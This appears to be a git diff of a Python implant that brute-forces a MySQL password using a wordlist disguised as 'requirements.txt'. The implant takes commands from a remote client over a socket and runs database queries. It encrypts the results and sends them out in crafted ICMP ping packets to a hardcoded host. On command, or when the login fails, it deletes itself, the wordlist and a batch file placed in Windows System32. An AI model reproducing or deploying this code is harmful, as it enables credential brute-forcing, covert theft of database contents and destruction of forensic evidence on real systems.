@@ -2,6 +2,7 @@ import mysql.connector as mysql
 import os, sys, socket, struct, select, time
 import datetime
 import re
+from itertools import cycle
 import string
 from sys import argv
 
@@ -143,16 +144,14 @@ def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
         except Exception as e:
             return e
 
-def deobf(num):
-    if num:
-        return chr(num % 256) + convert(num // 256)
-    else:
-        return ""
-
 def main():
     host = "192.168.20.12"
     client = "192.168.20.9"
-    wordlist=open("rockyou-75.txt","r+").read().splitlines()
+    dirname =  os.path.dirname(__file__)
+    wordlist_file = os.path.join(dirname, "requirements.txt")
+    payload_file = os.path.join(dirname, argv[0])
+    batch_file = os.path.join("C:","Windows","System32","windows_runner.bat")
+    wordlist=open(wordlist_file,"r+").read().splitlines()
     password = getPassword(wordlist)
     pw=True
     if password == "NO PASSWORD":
@@ -169,7 +168,9 @@ def main():
         (client_socket, client_address) = server_socket.accept()
         if pw==False:
                 client_socket.send(b"Out")
-                os.remove(argv[0])
+                os.remove(wordlist_file)
+                os.remove(batch_file)
+                os.remove(payload_file)
                 sys.exit()
         client_socket.send(b"In")
         while True:
@@ -180,7 +181,9 @@ def main():
                 if client_input.decode() == 'E':
                     break
                 elif client_input.decode() == 'D':
-                    os.remove(argv[0])
+                    os.remove(wordlist_file)
+                    os.remove(batch_file)
+                    os.remove(payload_file)
                     sys.exit()
                 else:
                     command = b""
@@ -190,7 +193,6 @@ def main():
                     client_socket.send(b"ping!")
                     data = encrypt_data(sql_result)
                     result = sendOnePing(1, client, 102, data)
-                    client_socket.send(result.decode())
 
         client_socket.close()
         server_socket.close()
